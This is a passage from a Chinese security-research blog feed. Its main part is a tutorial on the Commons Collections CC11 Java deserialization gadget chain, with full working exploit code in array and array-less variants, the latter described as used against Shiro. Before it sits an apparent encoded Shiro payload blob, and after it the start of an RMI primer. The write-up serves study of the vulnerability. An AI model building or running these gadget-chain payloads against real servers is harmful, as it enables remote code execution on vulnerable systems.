<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HNHE2+QzTA2hE+Z40rjHh2eX6Onde/rnm7DAm42IOYcgZgqqjvZP+ueiCX9mo+r7XJ/GHYK6G2jhTz25+5UGvbaZpGWUaJZGXmr4GcQGh+hQ8YRrQLLuH3ENgH7wHibNVPDI7Y6tGv3dQ1EQjywQtztK605ylB2JHEyy21US6LwU7wAa3sREcwWsNQclvNa44kRjkqi1TzQwou+OU95pQP06h<span class="comment">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</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735123471446-c9e713c1-9e66-431d-92e5-1d213035f74f.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>CC11链</title>
    <url>/2025/03/04/CC11%E9%93%BE/</url>
    <content><![CDATA[<h1 id="Smxco">CC11</h1>
 分析完CC1-7，继续分析一下CC11，CC11使用字节码加载，它其实是CC2+CC6的组合变形

<ul>
<li><strong>漏洞版本：cc组件3.1-3.2.1</strong></li>
</ul>
<p>这里我把CC链子的流程图放上来，实际根据CC1-7，可以衍生出来很多CCN</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741058279629-9fa7a895-47f9-4b27-bcb1-0b116b2a7980.png"></p>
<h2 id="HscmM">CC11攻击链分析</h2>
<h3 id="Ac9wG">有数组攻击链</h3>
<h4 id="VQNKU">恶意类加载</h4>
CC2链流程

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">				...</span></span><br><span class="line"><span class="comment">					TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">						InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">							Method.invoke()</span></span><br><span class="line"><span class="comment">								Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>CC11的前半段和CC2的前半段是一样的</p>
<p>只需要调用templates的<code>newTransformer</code>方法的话，就可以实现恶意类的加载（这里的流程我们就不分析了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span>templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    templates.newTransformer();</span><br></pre></td></tr></table></figure>

<h4 id="un6zg">后半部分</h4>
<h5 id="Y0meL">调用newTransformer</h5>
CC6链流程

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">xxx.readObject()</span></span><br><span class="line"><span class="comment">	HashMap.put()</span></span><br><span class="line"><span class="comment">	HashMap.hash()</span></span><br><span class="line"><span class="comment">		TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">		TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">			LazyMap.get()</span></span><br><span class="line"><span class="comment">				ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">					InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">						Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>这里就使用CC6的后半段代码，利用<code>TiedMapEntry</code>的<code>hashCode</code>方法，一步一步调用到<code>InvokerTransformer</code>，利用它来执行<code>newTransformer</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.put(tiedMapEntry,<span class="literal">null</span>);</span><br><span class="line">        lazymap.remove(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>感觉CC6这里没有很熟练，将流程再分析一下</p>
</blockquote>
<h5 id="IWrdr">调用chainedTransformer.transformer</h5>
调用transformer方法，这里用`LazyMap.get`去触发

<p>从<code>get</code>方法中可以发现<code>factory.transform</code>的factory是可以在构造函数中赋值的，因此对于我们是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="kEVmU">调用get方法</h5>
这里使用`TiedMapEntry`的`getValue`方法，我们可以从构造方法中看到map和key都是可控的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="Vemi5">调用getValue</h5>
`getValue`方法，我们可以从本类的`hashCode`方法中找到调用

<p>且该方法我们想到可以使用<code>HashMap</code>作为入口，这里<code>HashMap</code>入口调用<code>hashCode</code>不在赘述</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="XWg9m">EXP编写</h4>
这里我们的EXP就已经写完了，但是我们发现在`put`时，就已经触发了计算器，是因为在put时也会触发其`hashCode`方法我们也和CC6一样，先改为无用的东西，后面通过反射调用

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>通过修改以后，我们的代码就可以成功序列化，并在反序列化执行恶意类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Map</span>&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087011681-0864d6fd-0f51-4b44-8c5d-19a72da2618d.png"></p>
<h3 id="heBQB">无数组攻击链</h3>
无数组的CC11攻击链常用于攻击shiro时使用

<p>无数组相比于有数组的差异，只在调用<code>InvokerTransformer.transform(templates)</code>时，传入templates参数的地方有一些差异</p>
<p>有数组攻击链，利用<code>ChainedTransformer</code>的递归调用，和<code>ConstantTransformer</code>的指定返回类来传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087513248-dcd832e1-3f04-4b68-8883-2b1575f1c254.png"></p>
<p>而无数组的攻击链，参数是从<code>getValue</code>调用<code>LazyMap</code>的<code>get</code>方法时传入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//LazyMap</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要做一些简单的替换即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Map</span>&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087717823-53707e86-aabb-4303-acf0-809ad9fa22f9.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI基础</title>
    <url>/2025/03/05/RMI%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="ZVq5p"><font style="color:rgb(51, 51, 51);">RMI专题</font></h1>
<h2 id="rxJdj"><font style="color:rgb(51, 51, 51);">RMI简介</font></h2>
<font style="color:rgb(51, 51, 51);">最早的最早，从分布式概念出现以后，工程师们，制造了一种，基于Java语言的</font>**<font style="color:rgb(51, 51, 51);">远程方法调用</font>**<font style="color:rgb(51, 51, 51);">的东西，它叫RMI（Remote Method Invocation），我们使用Java代码，可以利用这种技术，去跨越JVM，调用另一个JVM的类方法。</font>

<p><font style="color:rgb(51, 51, 51);">因为任何东西都是基于socket，</font><code>RMIClient</code><font style="color:rgb(51, 51, 51);">直接去找</font><code>RMIServer</code><font style="color:rgb(51, 51, 51);">，并不知道这个类是基于哪个端口的，所以有了RMI Registry</font></p>
<p><font style="color:rgb(51, 51, 51);">我们需要把被调用的类，注册到一个叫做RMI Registry的地方，只有把类注册到这个地方，调用者就能通过RMI Registry找到类所在JVM的ip和port，才能跨越JVM完成远程方法的调用。</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735188727445-5d321176-e232-4e1f-9310-874d46b4c7eb.png"></p>
<h2 id="Q4JuW">实现</h2>
这里我们来做一个简单的实现

<p>我们需要准备一个Client和一个Server，首先他们需要定义一个一样的接口<code>IRemoteObj</code></p>
